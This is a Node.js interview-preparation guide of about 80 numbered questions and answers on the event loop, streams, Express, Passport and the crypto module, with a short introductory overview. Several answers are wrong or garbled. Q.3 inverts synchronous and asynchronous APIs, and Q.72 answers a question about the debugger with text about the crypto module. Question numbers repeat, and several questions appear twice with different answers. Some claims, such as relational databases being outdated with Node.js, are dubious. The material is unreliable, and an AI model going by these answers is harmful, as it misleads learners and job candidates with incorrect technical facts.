Event-driven Architecture: Node.js uses an event-driven, asynchronous model, making it suitable for building scalable applications that can handle a large number of simultaneous connections.
Large Ecosystem (NPM): Node.js has a vast ecosystem of open-source libraries and modules available through the Node Package Manager (NPM), facilitating rapid development.
Community Support: It has a large and active community, leading to continuous improvement, updates, and the availability of resources.
3.How Node.js works:

Node.js uses an event-driven, non-blocking I/O model.
It employs the V8 JavaScript engine to execute JavaScript code.
The event loop and callbacks handle asynchronous operations, allowing Node.js to efficiently manage multiple connections simultaneously.
4.Why is Node.js Single-threaded:

Ans.Node.js is single-threaded to provide simplicity and avoid the complexities of managing multiple threads and synchronization issues.However, it uses an event-driven, non-blocking model to handle concurrent operations efficiently.

5.Handling Concurrency in Node.js:

Ans. While Node.js is single-threaded, it can handle concurrency through its event-driven, asynchronous architecture.I/O operations, such as file system operations or network requests, are non-blocking, allowing the program to continue executing other tasks while waiting for I/O to complete.

6. Callback in Node.js:

Ans.A callback is a function passed as an argument to another function in Node.js.It is commonly used to handle asynchronous operations, such as reading files or making network requests.When the asynchronous operation is completed, the callback function is invoked to handle the results.

7.Advantages of Promises over Callbacks:

Ans.

Chaining: Promises allow for cleaner and more readable code through method chaining.
Error Handling: Promises provide a more structured way of handling errors, making it easier to catch and handle exceptions
.Avoiding Callback Hell: Promises help mitigate the issue of nested callbacks, also known as “Callback Hell” or “Pyramid of Doom,” improving code maintainability.
8.I/O (Input/Output):

Ans.In the context of Node.js, I/O refers to operations involving reading from or writing to external resources, such as files, databases, or network connections.Node.js is particularly efficient at handling I/O operations asynchronously.

9.Most Frequent Use of Node.js:

Ans.Node.js is commonly used to build scalable network applications, such as web servers and real-time applications like chat applications, online gaming platforms, and collaborative tools.

10.Frontend vs. Backend Development:

Ans. Frontend Development: Involves creating the user interface and user experience of a website or application. It deals with the presentation layer, including design, layout, and client-side scripting (e.g., HTML, CSS, JavaScript).

Backend Development: Involves building the server-side of a web application. It deals with server-side logic, databases, and handling requests from the client side. Technologies like Node.js are often used for backend development.

11.NPM (Node Package Manager):

Ans.NPM is the default package manager for Node.js, allowing developers to discover, install, and manage packages and dependencies for their Node.js projects.It provides a vast repository of open-source libraries and tools, making it easy for developers to integrate pre-built functionality into their applications.

Embarking on your journey in the Node.js universe, whether as a fresher or an experienced professional, can be thrilling, yet a tad bit daunting. The path towards acing that interview often winds through the most fundamental concepts to the most intricate facets of this extensive ecosystem. The array of questions that can arise may leave you pondering where to direct your preparation efforts. However, rest assured, we've designed a resource that's got you covered!

Welcome to our meticulously curated guide on 'Node.js interview questions'. This comprehensive treasure trove has been crafted to cater to everyone, from beginners grappling with 'Node.js interview questions for freshers' to seasoned developers wrestling with 'Node.js interview questions for experienced'. We've compiled a list of 100 key questions that traverse the breadth and depth of Node.js, beginning with the basics and escalating to cover the advanced aspects.

Q.1. Where is Node.js used?

Solution: Node.js is employed across diverse domains, earning high esteem, particularly in the realm of:

Network applications
Distributed computing
Responsive web applications
Server-client applications
Q.2. Why is Node.js single-threaded?

Solution: By operating on a single-threaded model, Node.js guarantees support for asynchronous processing. This unique approach enhances scalability and efficiency, enabling applications to deliver exceptional performance and effectiveness even when subjected to heavy loads.

Q.3. What are the different API functions supported by Node.js?

Solution: Two distinct categories of API functions exist, each serving a specific purpose:

Synchronous APIs: These are employed for non-blocking functions, enabling smooth execution without causing delays or interruptions.
Asynchronous APIs: These are utilized for blocking functions, facilitating the handling of tasks that require waiting for a response or completion before proceeding.
Q.4. What is the control flow function?

Solution: In Node.js, control flow functions play a vital role in managing the execution order of asynchronous function calls. These code snippets are commonly utilized to determine the sequence in which these functions are evaluated whenever they are invoked.

Q.5. Why is Node.js so popular these days?

Solution: Node.js has garnered significant popularity due to its predominant use of JavaScript, offering programmers a wide range of possibilities, including:

Server-side JavaScript: It enables developers to write JavaScript code that runs on the server, expanding the language's capabilities beyond just browser-based applications.
Access to the HTTP stack: Node.js provides convenient access to the HTTP stack, allowing programmers to handle web requests and responses effectively.
File I/O entities: It offers streamlined file input/output operations, enabling seamless handling of file-related tasks.
Support for TCP and other protocols: Node.js facilitates the development of network applications by providing support for TCP and various other protocols.
Direct database access: It grants direct access to databases, empowering developers to interact with databases efficiently and effortlessly.
Q.6. What is an event loop in Node.js?

Solution: When running an application in Node.js, the handling of callbacks is essential. To accomplish this, Node.js employs event loops, which play a crucial role due to its support for non-blocking communication.

The event loop operates by initiating callbacks whenever an event is triggered, often through a dedicated listener. After calling these functions, Node.js continues executing the code without waiting for the outputs to be obtained immediately.

Once all the code has been executed, the outputs are retrieved, and the callback function is invoked. This process operates in a continuous loop, aptly named the event loop, ensuring efficient handling of callbacks throughout the application's execution.

Q.7. What are the asynchronous tasks that should occur in an event loop?

Solution: The event loop in Node.js enables the execution of several tasks asynchronously, including:

Handling Blocking Send Requests: Node.js efficiently manages to block send requests by executing them asynchronously, allowing other operations to proceed without being blocked.
High Computational Requirements: Node.js effectively handles tasks with high computational demands by executing them asynchronously, ensuring that the event loop remains responsive and other operations are not hindered.
Real-time I/O Operations: The event loop in Node.js is well-suited for real-time input/output (I/O) operations. It enables the seamless handling of real-time data streams, ensuring timely processing and responsiveness.
Q.8. What is the order of execution in control flow statements?

Solution: The processing of function calls in Node.js follows a specific sequence, governed by control flow statements. This order typically includes the following steps:

Execution and Queue Handling: The control flow statements manage the execution of function calls and handle the queue of pending tasks.
Data Collection and Storage: As the function calls are processed, data is collected and stored, ensuring efficient handling and manipulation of information.
Concurrency Handling and Limiting: Control flow statements are responsible for managing concurrency, and controlling the number of simultaneous tasks being executed to prevent overwhelming the system.
Execution of the Next Piece of Code: Once the necessary tasks have been completed, the control flow statements facilitate the execution of the next segment of code in the application's flow, ensuring a smooth progression of operations.
Q.9. Are there any disadvantages to using Node.js?

Solution: In scenarios where intensive CPU computations are involved, a multi-threaded platform can deliver enhanced performance and responsiveness. However, it is worth noting that the usage of relational databases with Node.js is gradually becoming less prevalent and may be considered outdated.

Q.10. What is the primary reason to use the event-based model in Node.js?

Solution: The event-based model in Node.js serves as a solution to address the challenges that arise when employing blocking operations in the I/O channel.

Moving forward in this blog focused on Node.js inquiries, it is important to explore the process of importing libraries into Node.js.

Q.11. What are the security implementations that are present in Node.js?

Solution:  There are essential implementations that play a significant role in ensuring security:

Error Handling Protocols: Implementing robust error handling protocols helps in identifying and mitigating security vulnerabilities. Proper handling and reporting of errors can prevent sensitive information from being exposed and enhance the overall security of the application.
Authentication Pipelines: Establishing secure authentication pipelines is crucial for verifying the identity and access rights of users. Proper implementation of authentication protocols, such as multi-factor authentication and secure session management, helps protect against unauthorized access and bolster the security of the system.
Q.12. What is the meaning of a test pyramid?

Solution: The test pyramid methodology represents the distribution of test cases across different levels of testing, namely unit testing, integration testing, and end-to-end testing. It emphasizes executing a higher number of test cases at the unit testing level, followed by integration testing, and finally fewer test cases at the end-to-end testing level. This approach ensures comprehensive test coverage throughout the development lifecycle of a project.

Q.13. Why does Google use the V8 engine for Node.js?

Solution: Google employs the V8 engine due to its ability to seamlessly convert JavaScript code into a low-level language. This conversion process enables the execution of applications with exceptional performance. Additionally, it empowers users to interact with the application in real time, ensuring a smooth and responsive user experience.

Q.14. What is the difference between spawn and fork methods in Node.js?

Solution: The spawn() function in Node.js serves the purpose of creating and launching a new process using the command line. It generates a node module within the processor, which is invoked by Node.js when the child processes return data.

On the other hand, the fork() method can be seen as an extension of the spawn() method. By forking, multiple active worker nodes are established simultaneously, allowing for efficient task handling at any given moment. This approach ensures that there is an ample number of active worker nodes available to handle tasks effectively.

Q.15. What is the use of middleware in Node.js?

Solution: Middleware in Node.js refers to a straightforward function that plays a crucial role in handling incoming requests and outgoing response objects. Its primary functions include:

Executing Code: Middleware is responsible for executing code of any kind, such as performing operations, manipulating data, or implementing business logic, as part of the request-response cycle.
Updating Request and Response Objects: Middleware has the capability to modify and update the request and response objects, allowing for customizations and transformations as required by the application.
Completing Request-Response Iterations: Middleware ensures the completion of the request-response iterations by performing necessary actions and processing before passing control to the next middleware or sending the final response to the client.
Calling the Next Middleware: Middleware facilitates the flow of control by calling the next middleware function, enabling a sequential execution of multiple middleware functions in a defined order.
Q.16. What are global objects in Node.js?

Solution: Global objects in Node.js refer to objects that have a scope accessible across all modules of the application. This eliminates the need to include these objects in every module individually. By declaring an object as global, functions, strings, or objects can be accessed throughout the application, promoting code reusability and ease of access.

Moving on to another topic in Node.js coding questions, it is essential to explore the usage of assets in Node.js.

Q.17. What are stubs in Node.js?

Solution: Stubs play a vital role in assessing and analyzing the behavior of individual components during test cases. They are essentially functions that provide detailed insights into the execution of functions, enabling comprehensive testing and evaluation. By utilizing stubs, developers can gain valuable information about how specific functions are executed and their impact on the overall system behavior.

Q.18. How is a test pyramid implemented using the HTML API in Node.js?

Solution: Test pyramids are established by structuring the testing strategy around the HTML API, utilizing the following principles:

Higher Number of Unit Test Cases: Emphasizing a larger quantity of unit test cases helps ensure thorough testing at the component level, validating the functionality of individual units of code.
Smaller Number of Integration Test Methods: Integration tests focus on validating the interaction and integration between various components. While important, they typically involve a smaller number of test methods compared to unit tests.
Fewer Number of HTTP Endpoint Test Cases: HTTP endpoint tests, which validate the behavior and responses of the API endpoints, are typically fewer in number compared to unit and integration tests, as they primarily focus on testing the end-to-end functionality and overall system behavior.
By following this test pyramid structure, the testing strategy ensures comprehensive coverage while maintaining an appropriate balance between different types of tests.

Q.19. Why is a buffer class used in Node.js?

Solution: The Buffer class in Node.js serves as a fundamental tool for data storage. It can be likened to arrays or lists, providing a means to store and manipulate data. Unlike the V8 heap structure, the Buffer class represents a raw memory location.

The global nature of the Buffer class allows its usage across all modules within a Node.js application. This global accessibility enables seamless data sharing and manipulation throughout the different components and modules of the application.

Q.20. Why is ExpressJS used?

Solution: Express.js, a popular framework developed on Node.js, serves as a powerful tool for building web applications. It employs a middleware system that effectively manages the flow of data between servers and server-side applications.

Express.js is renowned for its lightweight nature and flexibility, making it a favored choice for designing mobile applications. It offers a plethora of features and functionalities that cater to the specific requirements of mobile app development, empowering developers to create robust and scalable mobile applications with ease.

Q.21.  What are the types of streams available in Node.js?

Solution: Node.js encompasses support for several types of streams, including:

Duplex Streams: These streams enable both reading from and writing to a resource. They provide bidirectional data flow, allowing for simultaneous reading and writing operations.
Readable Streams: Readable streams facilitate the process of reading data from a source, such as a file or network connection. They allow for sequential data consumption.
Writable Streams: Writable streams enable the writing of data to a destination, such as a file or network connection. They provide an interface for sending data in chunks or continuously.
Transform Streams: Transform streams function as duplex streams that modify or transform the data as it passes through. They can be used for tasks like compression, encryption, or data manipulation during the streaming process.
By supporting these different stream types, Node.js provides flexibility and efficiency in handling data flow and processing operations.

Q.22. What is the use of REPL in Node.js?

Solution: REPL, which stands for Read-Eval-Print-Loop, serves as an interactive and virtual environment within Node.js for testing JavaScript code.

To launch the REPL, users can simply execute the 'node' command in their command-line interface. This opens up a prompt where JavaScript commands can be directly entered and evaluated. The entered code is read, evaluated, and the result is printed back in a continuous loop, allowing for rapid experimentation and testing of JavaScript code snippets in real time.

Q.23. What is meant by tracing in Node.js?

Solution: Tracing is a powerful technique employed to gather comprehensive tracing information generated by V8, the node core, and user-space code. This methodology involves capturing and logging all relevant tracing data into a dedicated log file. This log file serves as a valuable resource for validating and verifying the integrity of the information being transmitted, enabling in-depth analysis and troubleshooting of the system's behavior and performance.

Q.24. What is the difference between readFile and createReadStream in Node.js?

Solution: The readFile function in Node.js allows for asynchronous reading of the entire contents of a specified file. It reads the complete content into memory before making it accessible to users. This method is suitable for smaller files or cases where reading the entire file into memory is not a performance concern.

On the other hand, the createReadStream function is utilized to read a file by breaking it into smaller chunks. By default, each chunk has a size of 64 KB, but this can be adjusted according to specific requirements. This approach is particularly useful for handling large files or scenarios where memory efficiency is a concern, as it allows for streaming and processing data in manageable chunks rather than loading the entire file at once.

Q.25. What is the use of the crypto module in Node.js?

**Solution:**The crypto module in Node.js serves as a valuable tool for implementing cryptographic functionalities. It offers a wide range of wrappers and APIs that enable users to perform various operations related to encryption, decryption, signing, and hashing.

With the crypto module, developers can effortlessly execute operations like ciphering data to ensure confidentiality, deciphering encrypted data, signing data to ensure authenticity and integrity, and performing hash functions for data integrity verification. These capabilities provided by the crypto module empower users to incorporate robust security measures into their Node.js applications.

Q.26. What is a passport in Node.js?

Solution: Passport is a highly popular middleware used in Node.js, specifically designed for authentication purposes. It seamlessly integrates into Express.js-based web applications, making authentication implementation effortless.

Each application requires unique authentication mechanisms, and Passport simplifies this process by providing modular authentication strategies. These strategies can be easily assigned to applications based on specific requirements, eliminating dependencies and ensuring a flexible and customizable authentication setup. With Passport, developers can implement robust authentication systems with ease, enhancing the security and user experience of their Node.js applications.

Q.27. What is the use of EventEmitter in Node.js?

Solution: In Node.js, every object that emits events is essentially an instance of the EventEmitter class. This class provides a mechanism for establishing a connection between objects and named events.

When an EventEmitter object emits an event, synchronous attachments of functions are made. These functions, also known as event handlers or listeners, are executed in response to the emitted event. They allow developers to define custom logic and actions to be performed when specific events occur, enabling event-driven programming in Node.js.

Q.28. What is the difference between setImmediate() and setTimeout()?

Solution: The setImmediate() function in Node.js is designed to execute a given script once the current event loop is complete. It ensures that the provided script is scheduled for immediate execution, allowing other I/O operations to take place without delay.

On the other hand, the setTimeout() function is used to delay the execution of a script by a specified time threshold. It schedules the script to run after the designated delay has passed.

The order of execution between setImmediate() and setTimeout() functions depends on the context in which they are called. If called from the main module, the timing of execution will be influenced by the performance of the underlying process and other factors affecting event loop scheduling.

Q.29. What is the use of module.exports in Node.js?

Solution: The module.exports function in Node.js allows for the exposure of functions or variables from a module, making them accessible in other parts of the application. It provides a way to encapsulate related code into a single module.

A module, in Node.js, acts as a container for organizing and grouping related code into a cohesive unit. It allows developers to logically structure their codebase and separate concerns. By utilizing module.exports, specific functions or variables defined within a module can be made available for use in other parts of the application, enabling modularity and code reuse. This simplifies the organization and management of code by consolidating related functionality into a single file.

Q.30. What are some of the most commonly used libraries in Node.js?

Solution: In the Node.js ecosystem, there are two popular libraries commonly used by developers:

Express.js: Express is a versatile web application framework for Node.js. It offers a comprehensive set of features and functionalities that facilitate the development of web and mobile applications. Express provides a minimalist and flexible approach, allowing developers to build robust and scalable applications with ease. It simplifies routing, middleware integration, and handling of HTTP requests and responses, making it a preferred choice for building web APIs and server-side applications.

Mongoose: Mongoose is a powerful Node.js library that simplifies the process of connecting and interacting with databases, particularly MongoDB. It provides an object modeling interface for MongoDB, allowing developers to define data schemas, perform CRUD operations, and perform advanced querying. Mongoose enhances productivity by providing a higher-level abstraction over MongoDB's native driver, making database operations more intuitive and straightforward.

By leveraging Express.js and Mongoose, developers can create efficient and feature-rich web applications while seamlessly connecting and managing their data storage needs.

Q.31. What are the pros and cons of Node.js?

|
Node.js Pros

|

Node.js Cons

|
| --- | --- |
|

Fast processing and an event-based model

|

Not suitable for heavy computational tasks

|
|

Uses JavaScript, which is well-known among developers

|

Using callback is complex since you end up with several nested callbacks

|
|

Node Package Manager has over 50,000 packages that provide the functionality to an application

|

Dealing with relational databases is not a good option for Node.js

|
|

Best suited for streaming huge amounts of data and I/O-intensive operations

|

Since Node.js is single-threaded, CPU intensive tasks are not its strong suit

|

Q.32. What is the command used to import external libraries?

Solution: The "require" command in Node.js is used to import external libraries or modules into a Node.js application. It allows developers to access and utilize the functionality provided by those libraries within their code. For example, the statement "var http = require('http');" imports the "http" module, which is a built-in module in Node.js, and assigns it to the variable "http". This allows the developer to use the functionality provided by the "http" module in their application.

The "require" command is crucial for leveraging the vast ecosystem of existing Node.js modules and libraries, enabling developers to extend the capabilities of their applications without having to reinvent the wheel.

Q.33. What does event-driven programming mean?

Solution: Event-driven programming is a programming paradigm where the flow of execution is driven by events. Events, such as user interactions or system notifications, trigger specific functions or callbacks that are registered to handle those events. This approach allows for responsive and interactive applications that can react to events as they occur, enabling the decoupling of components and efficient handling of asynchronous tasks.

Q.34.  Differentiate between the process.nextTick() and setImmediate()?

Solution: The distinction between nextTick() and setImmediate() lies in their timing within the event loop.

The nextTick() function in Node.js postpones the execution of a callback until the next pass around the event loop. It ensures that the callback is executed once the current execution of the event loop is complete. This means that any actions scheduled with nextTick() will be prioritized and executed before any I/O operations or timers in the event loop. It is often used to defer the execution of code to a later point in the event loop and is useful for ensuring that certain actions are performed before I/O operations or other asynchronous tasks.

On the other hand, setImmediate() function in Node.js schedules a callback to be executed on the next cycle of the event loop. It allows the event loop to continue processing I/O operations and other callbacks before executing the specified callback. setImmediate() is commonly used when you want to ensure that the callback is executed in a non-blocking manner, giving priority to other I/O operations or timers in the event loop.

In summary, nextTick() executes the callback before I/O operations in the current event loop iteration, while setImmediate() executes the callback in the next event loop iteration, allowing I/O operations to be processed first.

Q.35. How do you create a simple Express.js application?

Solution: To create a simple Express.js application, follow these steps:

Install Express.js by running npm install express.
Import the Express module: const express = require('express').
Create an instance of the Express application: const app = express().
Define routes and their corresponding handlers using app.get(), app.post(), etc.
Start the server by listening on a specific port: app.listen(port).
Access the application in a web browser using the specified port.
Q.36. What are streams in Node.js?

Solution: Streams are utilized to handle continuous data reading or writing in Node.js.

There exist four types of streams:

Readable: Designed for reading data.
Writable: Intended for writing data.
Duplex: Facilitates both reading and writing operations.
Transform: Acts as a duplex stream, performing computation on input to produce output.
Q.37. Explain asynchronous and non-blocking APIs in Node.js.

Solution: In Node.js, all library APIs are asynchronous, making them non-blocking in nature.

When a Node.js server calls an API, it does not wait for the data to be returned. Instead, it proceeds to the next API call, and a notification mechanism, facilitated by Node.js events, handles the response from the previous API call.

Q.38. What is a callback function in Node.js?

Solution: A callback is a function that is executed after a specific task has been completed. It allows for non-blocking execution, enabling other code to run concurrently.

Now, let's move on to some advanced-level Node.js interview questions in the final section

Q.39. What is the buffer class in Node.js?

Solution: The Buffer class in Node.js provides a way to store and manipulate raw data, similar to an array of integers. It represents a raw memory allocation outside of the V8 heap. The Buffer class is used when working with binary data because pure JavaScript is not inherently compatible with such data types. By utilizing the Buffer class, Node.js enables efficient handling of binary data within JavaScript applications.

Q.40. What is piping in Node.js?

Solution: Piping is a mechanism in Node.js that allows for connecting the output of one stream to the input of another stream. It is commonly used to transfer data from one stream to another, enabling a seamless flow of data between streams. Piping simplifies the process of retrieving data from one stream and passing it as input to another stream, facilitating efficient data processing in Node.js.

Q.41. What is callback hell?

Solution: Callback hell, also referred to as the pyramid of doom, occurs when there are excessive levels of nested callbacks in code, making it difficult to read, understand, and maintain. This situation arises when asynchronous logic is not properly implemented, leading to a convoluted and tangled callback structure. Callback hell can make code harder to debug and manage, impairing the overall readability and maintainability of the codebase.

Q.42. What is a reactor pattern in Node.js?

Solution: The reactor pattern is a design concept that facilitates non-blocking I/O operations. It involves associating a handler with each I/O operation. When an I/O request is initiated, it is submitted to a demultiplexer. The demultiplexer is responsible for monitoring multiple I/O sources and determining which ones are ready for processing. Upon receiving the notification from the demultiplexer, the associated handler is invoked to handle the I/O operation in a non-blocking manner. The reactor pattern enables efficient handling of I/O operations by allowing the system to continue processing other tasks while waiting for I/O events to occur.

Q.43. What are the different types of HTTP requests?

Solution: HTTP defines various request methods that serve different purposes. Some commonly used request methods include:

GET: Used to retrieve data from a server. It is a safe and idempotent method, meaning it should not have any side effects on the server.
POST: Used to submit data to the server to create a new resource or trigger a specific action. It can have side effects on the server.
HEAD: Similar to the GET method, it only requests the headers of the response without the actual response body. It is often used to retrieve metadata about a resource without transferring its entire content.
DELETE: Used to request the removal of a specified resource on the server.
These request methods provide a standardized way for clients to interact with servers and perform various operations based on the specific requirements of an application.

Q.44. What is a first-class function in Javascript?

Solution: First-class functions in JavaScript and Node.js refer to the ability to treat functions as values. This allows functions to be assigned to variables, passed as arguments to other functions, and returned as values from functions. In Node.js, first-class functions are extensively used in asynchronous programming to write non-blocking code and handle high-concurrency I/O operations effectively. They enable the use of callback functions and higher-order functions, facilitating the creation of flexible and reusable code patterns.

Q.45. What is the difference between JavaScript and Node.js?

Solution: Node.js is a runtime environment that allows the execution of JavaScript code outside of a web browser. It provides additional capabilities and APIs, such as file system access and networking, that are not available in a browser environment. JavaScript, on the other hand, is the programming language itself and can be executed both in web browsers and in the Node.js runtime environment. Node.js extends the functionality of JavaScript and enables its usage for server-side and command-line applications.

Q.46. What are the asynchronous tasks that should occur in an event loop?

Solution: Asynchronous tasks that should occur in an event loop in Node.js include I/O operations, timers, and callback functions. By performing these tasks asynchronously, Node.js can handle a large number of concurrent requests without blocking the event loop.

Q.47. What is the order of execution in control flow statements?

Solution: In Node.js, control flow statements are executed in a specific order. The order of execution is determined by the event loop. The event loop is a mechanism in Node.js that allows for the execution of non-blocking I/O operations.

Q.48. What are the input arguments for an asynchronous queue?

Solution: An asynchronous queue in Node.js is a data structure that allows for the execution of functions in a specific order. Functions are added to the queue and are executed in the order that they were added. An asynchronous queue is useful when you want to execute a series of functions in a specific order.

Q.49. What is the difference between Node.js and Ajax?

Solution: Ajax and Node.js are two different technologies that are used for different purposes. Ajax is a client-side technology that allows for asynchronous communication between the client and the server. It is typically used to update parts of a web page without requiring a full page reload.

Node.js, on the other hand, is a server-side technology that is used for building fast, scalable, and efficient server-side applications. It is typically used for real-time applications, such as chat applications, online games, and streaming services.

Q.50. What is the advantage of using Node.js?

Solution: Node.js is fast and scalable. Node.js is easy to learn and use. Node.js is well-suited for real-time applications, such as chat applications, online games, and streaming services. This is because Node.js can handle a large number of connections and can perform non-blocking I/O operations, which makes it ideal for real-time communication.

Q.51. What is "non-blocking" in node.js?

Solution: In Node.js, non-blocking refers to the ability of the runtime environment to execute multiple tasks simultaneously without waiting for the completion of one task before starting the next. This is achieved through the use of asynchronous I/O operations, which allow Node.js to handle multiple requests concurrently.

Q.52. How does Node.js overcome the problem of blocking I/O operations?

Solution: Node.js uses an event-driven, non-blocking I/O model that allows it to handle I/O operations more efficiently. By using callbacks, Node.js can continue processing other tasks while waiting for I/O operations to complete. This means that Node.js can handle multiple requests simultaneously without causing any delays. Additionally, Node.js uses a single-threaded event loop architecture, which allows it to handle a high volume of requests without any issues.

Q.53. How can we use async await in node.js?

Solution: To use async/await in Node.js, you'll need to use functions that return promises. You can then use the async keyword to mark a function as asynchronous and the await keyword to wait for a promise to resolve before continuing with the rest of the code.

Q.54. Why should you separate the Express app and server?

Solution: Firstly, separating your app and server can make it easier to test your code. By separating the two, you can test your app logic independently of the server, which can make it easier to identify and fix bugs.

Secondly, separating your app and server can make it easier to scale your application. By separating the two, you can run multiple instances of your app on different servers, which can help to distribute the load and improve performance.

Finally, separating your app and server can make it easier to switch to a different server if necessary. By keeping your app logic separate from your server logic, you can switch to a different server without having to make any major changes to your code.

Q.55. Explain the concept of stub in Node.js.

Solution: In Node.js, a stub is a function that serves as a placeholder for a more complex function. Stubs are typically used in unit testing to replace a real function with a simplified version that returns a predetermined value. By using a stub, you can ensure that your unit tests are predictable and consistent.

Q.56. What are the security implementations that are present in Node.js?

Solution: One of the most important security features in Node.js is the ability to run code in a restricted environment. This is achieved through the use of a sandboxed environment, which can help to prevent malicious code from accessing sensitive data or causing any damage to the system.

Another important security feature in Node.js is the ability to use TLS/SSL to encrypt data in transit. This can help to prevent eavesdropping and ensure that sensitive data is protected.

Q.57. What is the use of the connect module in Node.js?

Solution: The Connect module can be used to handle different types of middleware, such as error-handling middleware, cookie-parsing middleware, and session middleware. Error-handling middleware is used to handle errors that occur during the request/response cycle. Cookie parsing middleware is used to parse cookies from the request header. Session middleware is used to manage user sessions.

Q.58. What's the difference between 'front-end' and 'back-end' development?

Solution: Front-end developers focus on the client side of the application, while back-end developers focus on the server side of the application. Both roles are important for building a successful web application and require different skill sets and expertise.

Q.59. What are LTS releases of Node.js?

Solution: LTS stands for Long-term support. LTS releases of Node.js are versions that are supported for an extended period, usually for 30 months from the time of release. These releases are typically more stable and reliable than non-LTS releases and are recommended for production use.

Q.60.  How does Node.js handle the child threads?

Solution: Node.js utilizes child processes to achieve parallelism and avoid blocking the main event loop. It creates separate instances of the Node.js runtime environment to execute code in parallel with the main process. This enables Node.js to scale better and make better use of available resources.

Q.61. How to Enhance Node.js Performance through Clustering?

Solution: Clustering can be used to improve the performance of HTTP servers, database connections, and other I/O operations. However, it is important to note that clustering does not guarantee a linear increase in performance.

Q.62. What is a thread pool, and which library handles it in Node.js?

Solution: A thread pool is a collection of threads that are used to execute tasks in parallel. In Node.js, the thread pool is handled by the libuv library, which is a multi-platform support library that provides asynchronous I/O operations.

Q.63. How are worker threads different from clusters?

Solution: Worker threads and clusters are two different approaches to leveraging the power of multiple CPUs in Node.js. While clusters create multiple instances of a Node.js process, each running on a separate CPU core, worker threads provide a way to create multiple threads within a single process.

Q.64. How to measure the duration of async operations?

Solution: The console.time and console.timeEnd methods allow you to measure the duration of a block of code. The console.time method is used to start the timer and the console.timeEnd method is used to stop the timer and log the duration to the console.

The performance.now method provides a more precise way to measure the duration of async operations. It returns the current timestamp in milliseconds, which can be used to calculate the duration of a task.

Q.63. How to measure the performance of async operations?

Solution: There are several tools and techniques you can use to measure performance, including using the built-in --prof flag, using the perf tool, and using third-party libraries like benchmark.js.

Q.64. What is the difference between readFile and create Read Stream in Node.js?

Solution: Create Read Stream is a better option for reading large files, while the read file is a better option for small files. It is important to choose the right method based on the size of the file and the requirements of the application.

Q.65. What is meant by tracing in Node.js?

Solution: Tracing is a technique used in Node.js to profile the performance of an application. It involves recording the function calls and events that occur during the execution of the application and analyzing the data to identify performance bottlenecks.

Q.66. What is the use of the crypto module in Node.js?

Solution: The crypto module is widely used in Node.js applications to generate secure random numbers, create digital signatures, and verify signatures. It also provides support for various encryption algorithms such as AES, DES, and RSA.

Q.67. What is a passport in Node.js?

Solution: Passport is a popular authentication middleware for Node.js. It provides a simple and modular way to implement authentication in Node.js applications. Passport supports many authentication mechanisms, including username/password, social logins like Facebook and Google, and JSON Web Tokens (JWTs).

Q.68. How to get information about a file in Node.js?

Solution: In Node.js, the fs module provides methods for working with the file system. To get information about a file, you can use the fs. stat() method. The fs. stat() method returns an object that contains information about the file, such as the file size, creation date, and modified date.

Q.69. What is the difference between setImmediate() and setTimeout()?

Solution: The setTimeout() method schedules code execution after a specified delay, measured in milliseconds. On the other hand, the setImmediate() method schedules code execution to occur immediately after the current event loop iteration completes. This means that setImmediate() has a higher priority than setTimeout().

Q.70. Explain the concept of Punycode in Node.js.

Solution: Punycode is a character encoding scheme used in the domain name system (DNS) to represent Unicode characters with ASCII characters. It is used to encode domain names that contain non-ASCII characters, such as Chinese or Arabic characters.

Q.71. Is cryptography supported in Node.js?

Solution: Node.js has a built-in crypto module that provides support for cryptographic functions like hashing, encryption, and decryption. It's easy to use and offers a range of algorithms, including AES for symmetric encryption and SHA-256 and SHA-512 for hashing. With this module, developers can generate random bytes, create HMACs, public and private key pairs, sign and verify messages, and more. By using the crypto module, developers can easily secure their applications and data.

Q.72. Does Node.js provide any Debugger?

Solution: Node.js offers a built-in crypto module that enables developers to perform various cryptographic functions without the need for external libraries. The module is designed to be user-friendly and provides support for a range of algorithms, including symmetric encryption and hashing. With the crypto module, developers can easily generate secure random data, create HMACs, generate public and private key pairs, sign and verify messages, and more. Using this module can help ensure the security of Node.js applications and data.

Q.73. What is the significance of the "__dirname" variable in Node.js?

Solution: In Node.js, "__dirname" is a global variable that represents the absolute path of the directory that contains the currently executing file. It allows you to create paths that are relative to the current file's location, making it useful when requiring modules or referencing other files or directories located relative to the current file.

Q.74. How do you manage dependencies in a Node.js project?

Solution: To manage dependencies in a Node.js project, use a package manager such as npm or Yarn. The general steps are to create a package.json file, install dependencies using "npm install," save dependencies using "npm install --save", manage dependencies with "npm ls" and "npm update," and use dependencies with the "require" function. Managing dependencies this way enables easy installation, updating, and removal of packages, tracks, and version dependencies and facilitates sharing and collaboration.

Q.75. Can you explain what the "require" function does in Node.js?

Solution: In Node.js, the "require" function is used to load and use modules that are defined in separate files. It searches for modules in core modules, local modules, and third-party modules. Once a module is found, its contents are loaded into a new object and returned. The "require" function allows you to modularize your code and build complex, modular applications.

Q.76. How do you handle concurrency in Node.js?

Solution: Node.js handles concurrency through an event-driven, non-blocking I/O model. Asynchronous functions, worker threads, cluster modules, and load balancers are some techniques used to handle concurrency in Node.js. These techniques allow developers to build high-performance, scalable applications that can handle a large number of concurrent requests.

Q.77. What are some common security vulnerabilities in Node.js applications, and how do you prevent them?

Solution: To prevent security vulnerabilities in Node.js applications, it is important to implement input validation and sanitation, use security-focused middleware, follow secure coding practices, keep dependencies up-to-date, use rate limiting and other defensive mechanisms, use HTTPS, use a security-focused hosting platform. By following these best practices, developers can help ensure that their Node.js applications are secure and protected from potential security threats.

Q.78. What is the purpose of the "path" module in Node.js?

Solution: The "path" module in Node.js provides utilities for working with file and directory paths. It helps developers write cross-platform code by providing a consistent way to work with file paths. Functions like "join," "resolve," and "dirname" can manipulate file paths regardless of the operating system. For example, the "basename" function gets the file name, and the "dirname" function gets the directory path.

Q.79. What are some best practices for writing efficient and scalable Node.js code?

Solution: Some best practices for writing efficient and scalable Node.js code include:

Avoid blocking I/O operations: Use non-blocking I/O operations and callbacks to ensure that your code can handle multiple requests simultaneously.
Use a process manager: Use a process manager like PM2 to manage your Node.js processes to ensure that they run smoothly and can be easily monitored.
Optimize code for performance: Use profiling tools to identify performance bottlenecks in your code, and optimize accordingly.
Use caching: Implement caching mechanisms to reduce the number of requests to your server and improve performance.
Use streams: Use streams to handle large amounts of data efficiently without loading it all into memory at once.
Q.80. How do you handle errors in Node.js applications?

Solution: In Node.js applications, errors can be handled using try-catch blocks, error-first callbacks, and middleware functions. Here are some approaches for handling errors in Node.js:

Try-catch blocks: Use try-catch blocks to catch synchronous errors in your code.
Example:

try {
  // some code that may throw an error
} catch (err) {
  console.error(err);
}
